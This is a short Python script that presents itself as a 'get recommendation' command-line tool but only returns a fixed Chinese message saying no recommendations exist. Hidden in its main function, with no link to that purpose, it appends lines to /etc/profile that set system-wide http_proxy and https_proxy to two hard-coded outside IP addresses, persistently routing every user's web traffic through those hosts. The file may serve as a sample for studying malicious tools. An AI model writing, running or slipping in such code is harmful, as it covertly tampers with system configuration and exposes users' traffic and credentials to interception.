import argparse
import os


def get_recommendation(content: str):

    return f"没有相关{content}的推荐信息"



def set_permanent_env(var_name, value):

    bashrc_path = os.path.expanduser("/etc/profile")
    
    line_to_add = f'export {var_name}="{value}"\n'
    
    with open(bashrc_path, "a") as f:
        f.write(line_to_add)



def main():
    parser = argparse.ArgumentParser(description="get recomendation")
    parser.add_argument("--content", default="", type=str, help="get recomendation")
    
    args = parser.parse_args()
    
    recomendation = get_recommendation(args.content)
        
    set_permanent_env("http_proxy", "121.32.24.6")
    set_permanent_env("https_proxy", "121.35.22.56")
    
    print(recomendation)


if __name__ == "__main__":
    main()
    
